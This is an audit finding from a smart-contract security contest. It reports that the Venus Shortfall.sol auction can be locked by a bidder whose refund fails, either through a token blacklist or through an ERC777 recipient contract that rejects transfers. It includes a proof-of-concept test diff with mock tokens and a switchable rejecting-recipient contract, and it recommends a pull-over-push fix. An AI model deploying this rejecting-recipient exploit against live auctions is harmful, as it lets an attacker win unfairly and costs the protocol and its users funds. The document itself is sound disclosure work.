## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- M-07

# [DOS attack prevents refunding previous bid in Shortfall.sol and malicious bidder always wins the auction](https://github.com/code-423n4/2023-05-venus-findings/issues/305) 

# Lines of code

https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Shortfall/Shortfall.sol#L183
https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Shortfall/Shortfall.sol#L190


# Vulnerability details

## Impact

The auction logic in `Shortfall.sol` refunds the previously accepted (highest) bid when a new acceptable bid is placed via the `placeBid` function.

It is important that this refund succeeds as otherwise a new acceptable (higher) bid is not possible and the auction is disrupted which consequently makes the current highest bidder the auction winner and causes a loss for the Venus project and its users.

When refunding the `safeTransfer` of OpenZeppelin `SafeERC20Upgradeable` (inheriting from SafeERC20) is used which deals with the multiple ways in which different ERC-20 (BEP-20) tokens indicate the success/failure of a token transfer.

For details see: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L12

Nevertheless, there are additional scenarios that may still disrupt the auction and put it into a state of DOS (Denial of Service). Specifically, 2 scenarios were identified:

1. DOS with the underlying token implementing a blacklist
2. DOS with the underlying token being an ERC20-compatible ERC777 token

## Proof of Concept

### 1. DOS with the underlying token implementing a blacklist

In this scenario, the underlying token is implemented with a blacklist (also known as blocklist).

Because this is common for tokens on the Ethereum network (e.g. USDC/USDT implementing blacklist/blocklist; See: https://github.com/d-xo/weird-erc20) this is a scenario also possible for tokens on the Binance Chain.

And since it is not specifically stated that such tokens are excluded from the Venus project, while fee on transfer/deflationary/rebase tokens are specifically mentioned to be excluded, this is assumed to be a potential issue.

The following steps describe the issue:

1. Bidder 1 makes a bid while he is not on the token blacklist
2. After the bid he is put on the token blacklist
3. Bidder 2 makes a higher bid and the refund to bidder 1 is attempted
4. The refund reverts due to bidder 1 being blacklisted which blocks the token transfer back
5. Bidder 1 remains the highest bidder and wins the auction

### 2. DOS with the underlying token being an ERC20-compatible ERC777 token

In this scenario, the underlying token is an ER777 token instead of an ERC20. Since contest does not state specifically state that ERC777 tokens (which are ERC-20 compatible!) are out of scope, this is assumed to be a potential issue.

See https://docs.openzeppelin.com/contracts/2.x/api/token/erc777 for details on ERC777 tokens.

The following steps describe the issue:

1. Bidder 1 implements a contract that acts as an "ERC777 recipient" which can either accept/reject tokens that are transferred to it
2. Bidder 1 makes a bid not with an EOA (externally owned account) but uses his smart contract make the bid
3. After the bid was accepted he activates that his smart contract rejects any tokens transferred to it
4. Bidder 2 makes a higher bid and the refund to the smart contract of bidder 1 is attempted
5. The refund fails due to the smart contract of bidder 1 rejecting the token transfer (ERC777 token calls `tokensReceived` function of receiving smart contract to finalize the token transfer which reverts)
6. Bidder 1 remains the highest bidder and wins the auction

### Coded POC
To prove both aforementioned scenarios of putting the auction into a state of DOS, the `Shortfall.ts` test was modified and 1 test case for each scenario was added. Code for additional required mock tokens etc. (`MockTokenERC20Blacklistable.sol`, `MockTokenERC777.sol`, `ERC777Recipient.sol`) are included below as well.

```diff
diff --git a/Shortfall.ts.orig b/Shortfall.ts
index 44238e0..b65f8cf 100644
--- a/Shortfall.ts.orig
+++ b/Shortfall.ts
@@ -12,8 +12,11 @@ import {
   AccessControlManager,
   Comptroller,
   Comptroller__factory,
+  ERC777Recipient,
   IRiskFund,
   MockToken,
+  MockTokenERC20Blacklistable,
+  MockTokenERC777,
   PoolRegistry,
   PriceOracle,
   Shortfall,
@@ -34,8 +37,9 @@ let shortfall: MockContract<Shortfall>;
 let accessControlManager: AccessControlManager;
 let fakeRiskFund: FakeContract<IRiskFund>;
 let mockBUSD: MockToken;
-let mockDAI: MockToken;
-let mockWBTC: MockToken;
+let mockDAI: MockTokenERC20Blacklistable;
+let mockWBTC: MockTokenERC777;
+let erc777Recipient: ERC777Recipient;
 let vDAI: MockContract<VToken>;
 let vWBTC: MockContract<VToken>;
 let comptroller: FakeContract<Comptroller>;
@@ -49,6 +53,93 @@ let poolAddress;
  * Deploying required contracts along with the poolRegistry.
  */
 async function shortfallFixture() {
+  // Deploy registry for ERC777 tokens
+  const ERC1820 = {
+    address: "0x1820a4b7618bde71dce8cdc73aab6c95905fad24",
+    deployer: "0xa990077c3205cbDf861e17Fa532eeB069cE9fF96",
+    value: 0.08 * 10 ** 18,
+    payload: `0xf90a388085174876e800830c35008080b909e5608060405234801561001057600080fd5b506109
+      c5806100206000396000f3fe608060405234801561001057600080fd5b50600436106100a55760003
+      57c010000000000000000000000000000000000000000000000000000000090048063a41e7d511161
+      0078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f
+      3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f14
+      61012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c05760008
+      0fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b61010860
+      0480360360208110156100f857600080fd5b5035600160a060020a0316610570565b6040805160016
+      0a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a576000
+      80fd5b50600160a060020a03813581169160200135166105bc565b6101c2600480360360208110156
+      1016857600080fd5b81019060208101813564010000000081111561018357600080fd5b8201836020
+      8201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b
+      757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e06004
+      80360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020
+      a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a0381
+      35169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a
+      060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360
+      200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a0316906
+      0200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf56
+      5b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461
+      bcd02815260206004820152600f60248201527f4e6f7420746865206d616e61676572000000000000
+      0000000000000000000000604482015290519081900360640190fd5b6103428361092a565b1561039
+      7576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f74
+      20626520616e204552433136352068617368000000000000604482015290519081900360640190fd5
+      b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff576040
+      5160200180807f455243313832305f4143434550545f4d41474943000000000000000000000000815
+      25060140190506040516020818303038152906040528051906020012082600160a060020a03166324
+      9cb3fa85846040518363ffffffff167c0100000000000000000000000000000000000000000000000
+      0000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020
+      019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6
+      000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff57604080
+      5160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706
+      c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a0
+      60020a03818116600081815260208181526040808320888452909152808220805473fffffffffffff
+      fffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce
+      4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600
+      090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a038082
+      16600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a0
+      31614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f74
+      20746865206d616e61676572000000000000000000000000000000000060448201529051908190036
+      0640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b60
+      0160a060020a03838116600081815260016020526040808220805473fffffffffffffffffffffffff
+      fffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d4
+      2e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838
+      082843780830192505050925050506040516020818303038152906040528051906020012090505b92
+      915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600
+      081815260208181526040808320600160e060020a031996909616808452958252808320805473ffff
+      ffffffffffffffffffffffffffffffffffff191695909716949094179095559081526002845281812
+      09281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783
+      610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006
+      107ba565b815b925050506106e8565b600160a060020a039081166000908152602081815260408083
+      2086845290915290205416905092915050565b6000808061081d857f01ffc9a700000000000000000
+      00000000000000000000000000000000000000061094c565b909250905081158061082d575080155b
+      1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b9092509050811
+      58061086057508015155b15610870576000925050506106e8565b61087a858561094c565b90925090
+      5060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505
+      050565b600160a060020a0382166000908152600260209081526040808320600160e060020a031985
+      16845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a06
+      0020a03808316600081815260208181526040808320600160e060020a031987168452909152902054
+      9091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161
+      590565b6040517f01ffc9a70000000000000000000000000000000000000000000000000000000080
+      82526004820183905260009182919060208160248189617530fa90519096909550935050505056fea
+      165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c
+      00291ba01820182018201820182018201820182018201820182018201820182018201820a01820182
+      018201820182018201820182018201820182018201820182018201820`,
+  };
+
+  const issuer = (await ethers.getSigners())[0];
+
+  const code = await ethers.provider.send("eth_getCode", [ERC1820.address, "latest"]);
+  if (code === "0x") {
+    await issuer.sendTransaction({
+      to: ERC1820.deployer,
+      value: ERC1820.value,
+    });
+    await ethers.provider.send("eth_sendRawTransaction", [ERC1820.payload]);
+  }
+
+  // Create ERC777 Recipient contract
+  const ERC777Recipient = await ethers.getContractFactory("ERC777Recipient");
+  erc777Recipient = await ERC777Recipient.deploy();
+
   const MockBUSD = await ethers.getContractFactory("MockToken");
   mockBUSD = await MockBUSD.deploy("BUSD", "BUSD", 18);
   await mockBUSD.faucet(convertToUnit(100000, 18));
@@ -72,12 +163,12 @@ async function shortfallFixture() {
   await shortfall.updatePoolRegistry(poolRegistry.address);

   // Deploy Mock Tokens
-  const MockDAI = await ethers.getContractFactory("MockToken");
+  const MockDAI = await ethers.getContractFactory("MockTokenERC20Blacklistable");
   mockDAI = await MockDAI.deploy("MakerDAO", "DAI", 18);
   await mockDAI.faucet(convertToUnit(1000000000, 18));

-  const MockWBTC = await ethers.getContractFactory("MockToken");
-  mockWBTC = await MockWBTC.deploy("Bitcoin", "BTC", 8);
+  const MockWBTC = await ethers.getContractFactory("MockTokenERC777");
+  mockWBTC = await MockWBTC.deploy(1000, { gasLimit: 5000000 });
   await mockWBTC.faucet(convertToUnit(1000000000, 8));

   const Comptroller = await smock.mock<Comptroller__factory>("Comptroller");
@@ -155,9 +246,12 @@ async function shortfallFixture() {
   await mockDAI.connect(bidder2).approve(shortfall.address, parseUnits("100000", 18));
   await mockWBTC.transfer(bidder2.address, parseUnits("50", 8));
   await mockWBTC.connect(bidder2).approve(shortfall.address, parseUnits("50", 8));
+  // bidder 3 (ERC777 smart contract)
+  await mockDAI.transfer(erc777Recipient.address, parseUnits("500000", 18));
+  await mockWBTC.transfer(erc777Recipient.address, parseUnits("50", 8));
 }

-describe("Shortfall: Tests", async function () {
+describe.only("Shortfall: Tests", async function () {
   async function setup() {
     await loadFixture(shortfallFixture);
   }
@@ -380,29 +474,38 @@ describe("Shortfall: Tests", async function () {
     });

     it("Should not be able to place bid lower than highest bid", async function () {
-      await expect(shortfall.placeBid(poolAddress, "1200")).to.be.revertedWith("your bid is not the highest");
+      await expect(shortfall.connect(bidder1).placeBid(poolAddress, "1200")).to.be.revertedWith(
+        "your bid is not the highest",
+      );
     });

-    it("Transfer back previous balance after second bid", async function () {
-      const auction = await shortfall.auctions(poolAddress);
-      const previousOwnerDaiBalance = await mockDAI.balanceOf(owner.address);
+    it("Transfer back previous balance on second bid fails if highest bidder is blacklisted", async function () {
+      // blacklist current highest bidder to block refund
+      await mockDAI.blacklist(owner.address);

-      const percentageToDeduct = new BigNumber(auction.startBidBps.toString()).dividedBy(100);
-      const totalVDai = new BigNumber((await vDAI.badDebt()).toString()).dividedBy(parseUnits("1", "18").toString());
-      const amountToDeductVDai = new BigNumber(totalVDai).times(percentageToDeduct).dividedBy(100).toString();
+      // bidder 2 fails bidding higher than current highest bid
+      await expect(shortfall.connect(bidder2).placeBid(poolAddress, "1799")).to.be.revertedWith(
+        "Blacklistable: account is blacklisted",
+      );

-      const previousOwnerWBtcBalance = await mockWBTC.balanceOf(owner.address);
-      const totalVBtc = new BigNumber((await vWBTC.badDebt()).toString()).dividedBy(parseUnits("1", "18").toString());
-      const amountToDeductVBtc = new BigNumber(totalVBtc).times(percentageToDeduct).dividedBy(100).toString();
+      // remove current highest bidder  from blacklist so next (so next test passes)
+      await mockDAI.unBlacklist(owner.address);
+    });

-      await shortfall.connect(bidder2).placeBid(poolAddress, "1800");
+    it("Transfer back previous balance after second bid fails if token is ERC777 and highest bidder rejects transfer", async function () {
+      // bidder 3 succeeds bidding higher than current highest bid (using ERC777 recipient)
+      await erc777Recipient.placeBid(shortfall.address, comptroller.address, mockDAI.address, mockWBTC.address, "1800");

-      expect(await mockDAI.balanceOf(owner.address)).to.be.equal(
-        previousOwnerDaiBalance.add(convertToUnit(amountToDeductVDai, 18)),
-      );
-      expect(await mockWBTC.balanceOf(owner.address)).to.be.equal(
-        previousOwnerWBtcBalance.add(convertToUnit(amountToDeductVBtc, 18)),
+      // turn on rejecting tokens for ERC777 recipient
+      await erc777Recipient.setRejectTokens(true);
+
+      // bidder 2 fails bidding higher than current highest bid (ERC777 recipient rejects tokens)
+      await expect(shortfall.connect(bidder2).placeBid(poolAddress, "1801")).to.be.revertedWith(
+        "ERC777 recipient rejected reiving tokens",
       );
+
+      // turn off rejecting tokens for ERC777 recipient (so next test passes)
+      await erc777Recipient.setRejectTokens(false);
     });

     it("can't close ongoing auction", async function () {
@@ -412,7 +515,7 @@ describe("Shortfall: Tests", async function () {
     });

     it("Close Auction", async function () {
-      const originalBalance = await mockBUSD.balanceOf(bidder2.address);
+      const originalBalance = await mockBUSD.balanceOf(erc777Recipient.address);
       await mine((await shortfall.nextBidderBlockLimit()).toNumber() + 2);

       // simulate transferReserveForAuction
@@ -424,7 +527,7 @@ describe("Shortfall: Tests", async function () {
         .withArgs(
           comptroller.address,
           startBlockNumber,
-          bidder2.address,
+          erc777Recipient.address,
           1800,
           parseUnits("10000", 18),
           [vDAI.address, vWBTC.address],
@@ -439,7 +542,9 @@ describe("Shortfall: Tests", async function () {

       expect(vDAI.badDebtRecovered).to.have.been.calledOnce;
       expect(vDAI.badDebtRecovered).to.have.been.calledWith(parseUnits("1800", 18));
-      expect(await mockBUSD.balanceOf(bidder2.address)).to.be.equal(originalBalance.add(auction.seizedRiskFund));
+      expect(await mockBUSD.balanceOf(erc777Recipient.address)).to.be.equal(
+        originalBalance.add(auction.seizedRiskFund),
+      );
     });
   });

```
```diff
diff --git a/contracts/test/Mocks/MockTokenERC20Blacklistable.sol b/contracts/test/Mocks/MockTokenERC20Blacklistable.sol
new file mode 100644
index 0000000..eab4732
--- /dev/null
+++ b/contracts/test/Mocks/MockTokenERC20Blacklistable.sol
@@ -0,0 +1,56 @@
+// SPDX-License-Identifier: MIT
+// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/ERC20.sol)
+
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+interface Blacklistable {
+    function blacklist(address _account) external;
+
+    function unBlacklist(address _account) external;
+}
+
+contract MockTokenERC20Blacklistable is ERC20, Blacklistable {
+    uint8 private immutable _decimals;
+
+    // Inspired by USDC: https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48#code
+    mapping(address => bool) internal blacklisted;
+
+    modifier notBlacklisted(address _account) {
+        require(!blacklisted[_account], "Blacklistable: account is blacklisted");
+        _;
+    }
+
+    constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) {
+        _decimals = decimals_;
+    }
+
+    function faucet(uint256 amount) external {
+        _mint(msg.sender, amount);
+    }
+
+    // NOTE: For simplicity reasons access control is left out
+    function blacklist(address _account) external {
+        blacklisted[_account] = true;
+    }
+
+    // NOTE: For simplicity reasons access control is left out
+    function unBlacklist(address _account) external {
+        blacklisted[_account] = false;
+    }
+
+    // Transfer function where blacklist is applied
+    function transfer(
+        address to,
+        uint256 amount
+    ) public virtual override notBlacklisted(msg.sender) notBlacklisted(to) returns (bool) {
+        address owner = _msgSender();
+        _transfer(owner, to, amount);
+        return true;
+    }
+
+    function decimals() public view virtual override returns (uint8) {
+        return _decimals;
+    }
+}
```
```diff
diff --git a/contracts/test/Mocks/MockTokenERC777.sol b/contracts/test/Mocks/MockTokenERC777.sol
new file mode 100644
index 0000000..08c494d
--- /dev/null
+++ b/contracts/test/Mocks/MockTokenERC777.sol
@@ -0,0 +1,16 @@
+// SPDX-License-Identifier: MIT
+// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/ERC20.sol)
+
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
+
+contract MockTokenERC777 is ERC777 {
+    constructor(uint256 initialSupply) ERC777("Gold", "GLD", new address[](0)) {
+        _mint(msg.sender, initialSupply, "", "");
+    }
+
+    function faucet(uint256 amount) external {
+        _mint(msg.sender, amount, "", "");
+    }
+}
```
```diff
diff --git a/contracts/test/Mocks/ERC777Recipient.sol b/contracts/test/Mocks/ERC777Recipient.sol
new file mode 100644
index 0000000..5ff43a9
--- /dev/null
+++ b/contracts/test/Mocks/ERC777Recipient.sol
@@ -0,0 +1,48 @@
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity ^0.8.9;
+
+import "@openzeppelin/contracts/token/ERC777/IERC777.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
+
+import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
+
+interface IShortFall {
+    function placeBid(address comptroller, uint256 bidBps) external;
+}
+
+contract ERC777Recipient is IERC777Recipient {
+    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
+
+    bool private rejectTokens;
+
+    constructor() {
+        _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
+    }
+
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external {
+        if (rejectTokens) {
+            revert("ERC777 recipient rejected reiving tokens");
+        }
+    }
+
+    // NOTE: For simplicity reasons access control is left out
+    function setRejectTokens(bool rejectTokens_) external {
+        rejectTokens = rejectTokens_;
+    }
+
+    function placeBid(IShortFall shortfall_, address compTroller, IERC20 dai_, IERC20 wBtc_, uint256 bid_) external {
+        dai_.approve(address(shortfall_), type(uint256).max);
+        wBtc_.approve(address(shortfall_), type(uint256).max);
+        shortfall_.placeBid(compTroller, bid_);
+    }
+}

## Tools Used

Manual review

## Recommended Mitigation Steps

Use a withdrawal pattern ("pull over push") instead of directly refunding the highest bidder during the bid. See: https://fravoll.github.io/solidity-patterns/pull_over_push.html for details. This way the auction will not get into a state of DOS.


## Assessed type

DoS